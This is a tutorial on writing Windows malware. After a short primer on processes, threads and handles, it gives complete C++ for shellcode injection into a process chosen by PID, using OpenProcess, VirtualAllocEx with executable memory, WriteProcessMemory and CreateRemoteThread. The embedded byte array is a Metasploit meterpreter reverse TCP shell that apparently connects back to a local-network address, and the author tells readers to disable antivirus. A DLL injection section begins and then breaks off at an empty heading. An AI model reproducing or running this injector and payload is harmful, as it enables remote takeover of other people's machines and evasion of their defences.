# Writing Malware in Windows

## 1. Introduction

To write malware in Windows you will need some basic knowledge of Processes, Threads and Handle.

### 1.1 Process

**A Process** is an isolated memory structure that supports an Application in the OS.
A Windows Process is executed by 1 or more **Threads**.

The OS, more specifically the **Scheduler** decides how much CPU time to allocate for each process.
That is controlled by the **Priority** of the process.

### 1.2 Thread

**A Thread** is a stream of sequential machine-code instructions that a process executes.
Threads are a component of a Process and access the same memory when they are in the same Process.
Processes may speed up their operation by using multiple threads, each performing an isolated task by running their
instructions through a different CPU Execution Unit.

### 1.3 Handle

**A Handle** is a kind of identifier for Processes/Threads. With the handle, you can
perform different kinds of actions like killing the Process or Reading and Writing in foreign Process memory.

Handles are consistent over the whole Operating System, so you can share Handles over different processes.

## 2. Shellcode Injection

In the shellcode Injection, we want to inject machine code into the Process.
We must use the right shell code for the injection.
For 64-bit Windows Systems, we have to use x64 machine code.

```cpp
#include <iostream>
#include <windows.h>

// Define the variables for later use.
DWORD pid;
HANDLE hThread, hProcess;
LPVOID rBuffer;


// This is the shellcode we are injecting.
// It is a basic meterpreter reverse tcp shell, generated by metasploit.
// Note: It will get detected by antivirus, so disable AV.
const char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x50\x49"
"\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x00\x02\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0c\x49\xff\xce\x75\xe5\x68\xf0\xb5\xa2\x56"
"\xff\xd5\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04"
"\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48"
"\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00"
"\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53"
"\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89"
"\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff"
"\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff"
"\xe7";


// Main function that executes first.
int main(int argc, char** argv)
{
    // Here I check if a argument is provided. If not the program exits.
	if (argc < 2) {
		std::cerr << "(-) No process specified" << std::endl;
		std::cerr << "Excpected: program.exe <pid>" << std::endl;
		return EXIT_FAILURE;
	}

    // Converting the arguent to unsigned long.
	pid = std::strtoul(argv[1], NULL, 10);

	std::cout << "(+) Attempting to get handle" << std::endl;

    // Open Process handle
	hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,         // DWORD    dwDesiredAccess,    The access rights that are requested
        FALSE,                      // BOOL     bInheritModule,     If this is true, processes that are created by this process will inherit the module.
        pid                         // DWORD    dwProcessId,        The Process ID of the process that should be opened
    );

    // Here I check if the handle is sucessfully returned
	if (!hProcess) {
		std::cerr << "(-) Could not open process, error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	std::cout << "(+) Got Proccess Handle, yay" << std::endl;

    // Allocate Memory in other Process
	rBuffer = VirtualAllocEx(
		hProcess,                   // HANDLE   hProcess            Handle to the target Process
		NULL,                       // LPVOID   lpAddress           Starting address of the region of pages, when NULL let function itself decide
		sizeof(shellcode),          // SIZE_T   dwSize              Size of region of memory to allocate
		MEM_COMMIT | MEM_RESERVE,   // DWORD    ftAllocationtype    Type of memory allocation. MEM_COMMIT and MEM_RESERVE the memory initially
		PAGE_EXECUTE_READWRITE      // DWORD    flProtect           Memory Protection constraints of the allocated memory
	);

	if (!rBuffer) {
		std::cerr << "(-) Could not allocate virtual memory, error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
    }

	std::cout << "(+) Allocated " << sizeof(shellcode) << " bytes of virtual memory with PAGE_EXECUTE_READWRITE Permissions" << std::endl;
	std::cout << "(+) Writing payload into process" << std::endl;

	WriteProcessMemory(
        hProcess,                   // HANDLE   hProcess            Handle to the target Process
        rBuffer,                    // LPVOID   lpBaseAddress       Pointer to base address in the target Process where the data is written to.
        shellcode,                  // LPCVOID  lpBuffer            Pointer to the data that is written to the target Process
        sizeof(shellcode),          // SIZE_T   nSize               Number of bytes that is written to the target process.
        NULL                        // SIZE_T   lpNumberofBytes     Output: Resulting number of bytes that got written.
    );

    // Create Remote Thread to execute loaded shellcode
	hThread = CreateRemoteThread(
		hProcess,                       // HANDLE                   hProcess            Handle to the target Process
		NULL,                           // LPSECURITY_ATTRIBUTES    lpThreadAttributes  A pointer to the security attributes of the new thread, if NULL default security gets used.
		0,                              // SIZE_T                   dwStackSize         Stack size of the new thread, if 0 default size gets used.
		(LPTHREAD_START_ROUTINE)rBuffer,// LPTHREAD_START_ROUTINE   lpStartAddress      Pointer to the start address of the thread.
		NULL,                           // LPVOID                   lpParamter          Variable to be passed into the thread function, not used here
		0,                              // DWORD                    dwCreationFlags     The flags to control the creation of the thread, here the thread just starts after calling the function.
		NULL                            // LPWORD                   lpThreadId          Output: A pointer to a variable that reiceives the thread identifier.
	);

    // Here I check if the Thread got successfully created.
	if (!hThread) {
		std::cerr << "Failed to get handle to the thread, error: " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	std::cout << "Got the handle thread: " << hThread << std::endl;

    // Waiting until the thread stops
	WaitForSingleObject(hThread, INFINITE);

    // Cleaning up
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
}
```

## 3. DDL Injection
First, it is good to know what dlls are and how to use them. Link to [docs](./dll.md#1-what-is-that).
After injecting the shellcode, I want to introduce you to dll injection.
DLL injection is very similar to shellcode injection, but now the code we are using comes from a self-written DLL.

### 3.2  
